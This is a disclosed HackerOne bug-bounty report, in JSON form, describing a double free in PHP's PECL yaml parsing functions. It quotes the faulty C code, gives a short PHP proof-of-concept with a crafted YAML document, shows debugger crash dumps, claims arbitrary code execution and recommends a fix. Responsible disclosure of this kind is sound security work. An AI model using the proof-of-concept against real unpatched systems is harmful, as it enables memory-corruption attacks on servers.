{"id":73256,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MzI1Ng==","url":"https://hackerone.com/reports/73256","title":"PHP yaml_parse/yaml_parse_file/yaml_parse_url Double Free","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-05-10T00:00:00.000Z","submitted_at":"2015-05-10T00:00:00.000Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"johnleitch","url":"/johnleitch","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":29,"url":"https://hackerone.com/ibb-php","handle":"ibb-php","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"PHP (IBB)","twitter_handle":"","website":"http://www.php.net","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2015-05-18T00:00:00.000Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2015-05-18T00:00:00.000Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"https://bugs.php.net/bug.php?id=69616\n\nDescription:\n------------\nThe yaml_* parsing functions suffers from an exploitable double free caused by the error path for the php_var_unserialize() call on line 797 of pecl/file_formats/yaml.git/parse.c:\n\n```\n        if (IS_NOT_IMPLICIT_AND_TAG_IS(event, YAML_PHP_TAG)) {\n                const unsigned char *p;\n                php_unserialize_data_t var_hash;\n\n                p = (const unsigned char *) value;\n                PHP_VAR_UNSERIALIZE_INIT(var_hash);\n\n                if (!php_var_unserialize(\n                                \u0026retval, \u0026p, p + (int) length, \u0026var_hash TSRMLS_CC)) {\n                        PHP_VAR_UNSERIALIZE_DESTROY(var_hash); \u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c First free\n                        php_error_docref(NULL TSRMLS_CC, E_NOTICE,\n                                        \"Failed to unserialize class\");\n                        /* return the serialized string directly */\n                        ZVAL_STRINGL(retval, value, length, 1);\n                }\n\n                PHP_VAR_UNSERIALIZE_DESTROY(var_hash); \u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c Second free\n                return retval;\n        }\n```\n    \nShould php_var_unserialize return false, var_hash is immediately freed via PHP_VAR_UNSERIALIZE_DESTROY, and then freed once more prior to the function returning. This code path can be forced by crafting a YAML document that contains an invalid !php/object value. An example is as follows:\n\n```\n\u003c?php \n\n$yaml = \u003c\u003c\u003cYAML\na:  !php/object O:0:1\nb: !php/object\n\n\n\nYAML;\nyaml_parse($yaml);\n?\u003e\n```\n\nAnd it produces the following crash:\n\n```\neax=00000000 ebx=55a0b760 ecx=02fc9e58 edx=000a0d08 esi=015c41f8 edi=02deedc8\neip=55a0b7dc esp=014ce1d0 ebp=00000000 iopl=0         nv up ei ng nz ac pe cy\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010297\nphp5ts!_efree+0x7c:\n55a0b7dc 8b043a          mov     eax,dword ptr [edx+edi] ds:002b:02e8fad0=??????\n??\n0:000\u003e k\nChildEBP RetAddr\n014ce1d8 55b9d92c php5ts!_efree+0x7c\n014ce1ec 613b45bd php5ts!var_destroy+0x1c\n014ce25c 613b50fb php_yaml!eval_scalar+0x60d\n014ce2ac 613b4a38 php_yaml!handle_scalar+0x2b\n014ce2c8 613b4d09 php_yaml!get_next_element+0xb8\n014ce384 613b4a16 php_yaml!handle_mapping+0x159\n014ce3a0 613b4afe php_yaml!get_next_element+0x96\n014ce3c4 613b3f33 php_yaml!handle_document+0x5e\n014ce3e4 613b5f37 php_yaml!php_yaml_read_partial+0x93\n014ce560 559e8721 php_yaml!zif_yaml_parse+0x177\n014ce5c4 559e7de8 php5ts!zend_do_fcall_common_helper_SPEC+0x161\n014ce600 559d33ea php5ts!execute_ex+0x378\n014ce628 559d31ab php5ts!zend_execute+0x1ca\n014ce65c 559d3694 php5ts!zend_execute_scripts+0x14b\n014ce86c 770c9580 php5ts!php_execute_script+0x1b4\n014ce8c4 76b9a3fa ntdll!RtlInitializeCriticalSectionEx+0xc2\n014ce8dc 76b9a293 KERNELBASE!BasepInitializeFindFileHandle+0x51\n014cecac 76b9a293 KERNELBASE!FindFirstFileExW+0x347\n014cefb4 76bc39cc KERNELBASE!FindFirstFileExW+0x347\n014cf25c 770eb1b7 KERNELBASE!FindFirstFileA+0x6c\n014cf29c 770c8891 ntdll!LdrpApplyLookupReference+0x1e\n014cf354 770c8c78 ntdll!RtlWow64EnableFsRedirectionEx+0x51\n014cf4c4 770c9493 ntdll!RtlDosApplyFileIsolationRedirection_Ustr+0x2d8\n014cf528 770c8092 ntdll!LdrpApplyFileNameRedirection+0x96\n014cf5fc 770d4d3e ntdll!_SEH_epilog4_GS+0xa\n014cf640 00000000 ntdll!LdrpGetProcedureAddress+0x3d\n```\n\nFurther, the document can be leveraged to manipulate the layout of memory, allowing for EIP control after the double free has occurred, and thus arbitrary code execution. An example that triggers a DEP access violation can be found here: http://autosectools.com/YamlDoubleFreeDepAV.txt\n\nAnd it produces the following exploitable crash: \n\n```\n0:000\u003e r\neax=b6072cb5 ebx=00000000 ecx=55fc7ce0 edx=01564358 esi=02e57450 edi=0155e4b8\neip=b6072cb5 esp=014ce3f0 ebp=014ce45c iopl=0         nv up ei pl zr na pe nc\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246\nb6072cb5 ??              ???\n0:000\u003e k\nChildEBP RetAddr\nWARNING: Frame IP not in any known module. Following frames may be wrong.\n014ce3ec 55a095a9 0xb6072cb5\n014ce40c 55d7bbd0 php5ts!_zval_copy_ctor_func+0x139\n00000000 00000000 php5ts!zend_std_read_property+0x3967e0\n```\n\nTo fix this issue, it is recommended that the free be removed from the error path taken when php_var_unserialize() returns false.\n\nTest script:\n---------------\nReadAV:\n\n```\n\u003c?php \n\n$yaml = \u003c\u003c\u003cYAML\na:  !php/object O:0:1\nb: !php/object\n\n\n\nYAML;\nyaml_parse($yaml);\n?\u003e\n```\n\nDEPAV:\nhttp://autosectools.com/YamlDoubleFreeDepAV.txt\n","vulnerability_information_html":"\u003cp\u003e\u003ca title=\"https://bugs.php.net/bug.php?id=69616\" href=\"/redirect?url=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D69616\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugs.php.net/bug.php?id=69616\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"description\"\u003eDescription:\u003c/h2\u003e\n\n\u003cp\u003eThe yaml_* parsing functions suffers from an exploitable double free caused by the error path for the php_var_unserialize() call on line 797 of pecl/file_formats/yaml.git/parse.c:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e        if (IS_NOT_IMPLICIT_AND_TAG_IS(event, YAML_PHP_TAG)) {\n                const unsigned char *p;\n                php_unserialize_data_t var_hash;\n\n                p = (const unsigned char *) value;\n                PHP_VAR_UNSERIALIZE_INIT(var_hash);\n\n                if (!php_var_unserialize(\n                                \u0026amp;retval, \u0026amp;p, p + (int) length, \u0026amp;var_hash TSRMLS_CC)) {\n                        PHP_VAR_UNSERIALIZE_DESTROY(var_hash); \u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt; First free\n                        php_error_docref(NULL TSRMLS_CC, E_NOTICE,\n                                        \u0026quot;Failed to unserialize class\u0026quot;);\n                        /* return the serialized string directly */\n                        ZVAL_STRINGL(retval, value, length, 1);\n                }\n\n                PHP_VAR_UNSERIALIZE_DESTROY(var_hash); \u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt; Second free\n                return retval;\n        }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eShould php_var_unserialize return false, var_hash is immediately freed via PHP_VAR_UNSERIALIZE_DESTROY, and then freed once more prior to the function returning. This code path can be forced by crafting a YAML document that contains an invalid !php/object value. An example is as follows:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e \n\n\u003cspan class=\"nv\"\u003e$yaml\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"sh\"\u003e\u0026lt;\u0026lt;\u0026lt;YAML\na:  !php/object O:0:1\nb: !php/object\n\n\n\nYAML;\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eyaml_parse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$yaml\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd it produces the following crash:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eeax=00000000 ebx=55a0b760 ecx=02fc9e58 edx=000a0d08 esi=015c41f8 edi=02deedc8\neip=55a0b7dc esp=014ce1d0 ebp=00000000 iopl=0         nv up ei ng nz ac pe cy\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010297\nphp5ts!_efree+0x7c:\n55a0b7dc 8b043a          mov     eax,dword ptr [edx+edi] ds:002b:02e8fad0=??????\n??\n0:000\u0026gt; k\nChildEBP RetAddr\n014ce1d8 55b9d92c php5ts!_efree+0x7c\n014ce1ec 613b45bd php5ts!var_destroy+0x1c\n014ce25c 613b50fb php_yaml!eval_scalar+0x60d\n014ce2ac 613b4a38 php_yaml!handle_scalar+0x2b\n014ce2c8 613b4d09 php_yaml!get_next_element+0xb8\n014ce384 613b4a16 php_yaml!handle_mapping+0x159\n014ce3a0 613b4afe php_yaml!get_next_element+0x96\n014ce3c4 613b3f33 php_yaml!handle_document+0x5e\n014ce3e4 613b5f37 php_yaml!php_yaml_read_partial+0x93\n014ce560 559e8721 php_yaml!zif_yaml_parse+0x177\n014ce5c4 559e7de8 php5ts!zend_do_fcall_common_helper_SPEC+0x161\n014ce600 559d33ea php5ts!execute_ex+0x378\n014ce628 559d31ab php5ts!zend_execute+0x1ca\n014ce65c 559d3694 php5ts!zend_execute_scripts+0x14b\n014ce86c 770c9580 php5ts!php_execute_script+0x1b4\n014ce8c4 76b9a3fa ntdll!RtlInitializeCriticalSectionEx+0xc2\n014ce8dc 76b9a293 KERNELBASE!BasepInitializeFindFileHandle+0x51\n014cecac 76b9a293 KERNELBASE!FindFirstFileExW+0x347\n014cefb4 76bc39cc KERNELBASE!FindFirstFileExW+0x347\n014cf25c 770eb1b7 KERNELBASE!FindFirstFileA+0x6c\n014cf29c 770c8891 ntdll!LdrpApplyLookupReference+0x1e\n014cf354 770c8c78 ntdll!RtlWow64EnableFsRedirectionEx+0x51\n014cf4c4 770c9493 ntdll!RtlDosApplyFileIsolationRedirection_Ustr+0x2d8\n014cf528 770c8092 ntdll!LdrpApplyFileNameRedirection+0x96\n014cf5fc 770d4d3e ntdll!_SEH_epilog4_GS+0xa\n014cf640 00000000 ntdll!LdrpGetProcedureAddress+0x3d\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eFurther, the document can be leveraged to manipulate the layout of memory, allowing for EIP control after the double free has occurred, and thus arbitrary code execution. An example that triggers a DEP access violation can be found here: \u003ca title=\"http://autosectools.com/YamlDoubleFreeDepAV.txt\" href=\"/redirect?url=http%3A%2F%2Fautosectools.com%2FYamlDoubleFreeDepAV.txt\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://autosectools.com/YamlDoubleFreeDepAV.txt\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eAnd it produces the following exploitable crash: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e0:000\u0026gt; r\neax=b6072cb5 ebx=00000000 ecx=55fc7ce0 edx=01564358 esi=02e57450 edi=0155e4b8\neip=b6072cb5 esp=014ce3f0 ebp=014ce45c iopl=0         nv up ei pl zr na pe nc\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246\nb6072cb5 ??              ???\n0:000\u0026gt; k\nChildEBP RetAddr\nWARNING: Frame IP not in any known module. Following frames may be wrong.\n014ce3ec 55a095a9 0xb6072cb5\n014ce40c 55d7bbd0 php5ts!_zval_copy_ctor_func+0x139\n00000000 00000000 php5ts!zend_std_read_property+0x3967e0\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eTo fix this issue, it is recommended that the free be removed from the error path taken when php_var_unserialize() returns false.\u003c/p\u003e\n\n\u003ch2 id=\"test-script\"\u003eTest script:\u003c/h2\u003e\n\n\u003cp\u003eReadAV:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e \n\n\u003cspan class=\"nv\"\u003e$yaml\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"sh\"\u003e\u0026lt;\u0026lt;\u0026lt;YAML\na:  !php/object O:0:1\nb: !php/object\n\n\n\nYAML;\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eyaml_parse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$yaml\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eDEPAV:\u003cbr\u003e\n\u003ca title=\"http://autosectools.com/YamlDoubleFreeDepAV.txt\" href=\"/redirect?url=http%3A%2F%2Fautosectools.com%2FYamlDoubleFreeDepAV.txt\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://autosectools.com/YamlDoubleFreeDepAV.txt\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","bounty_amount":"1500.0","formatted_bounty":"$1,500","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":0,"voters":[],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":496268,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2015-06-30T11:45:10.596Z","updated_at":"2015-06-30T11:45:10.596Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"bounty_amount":"1500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"ibb-php","collaborator":{"username":"johnleitch","url":"/johnleitch"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1196231,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":null,"markdown_message":"","automated_response":false,"created_at":"2015-06-30T11:45:10.596Z","updated_at":"2016-09-15T13:29:46.361Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"reporter":{"username":"johnleitch","url":"/johnleitch"},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}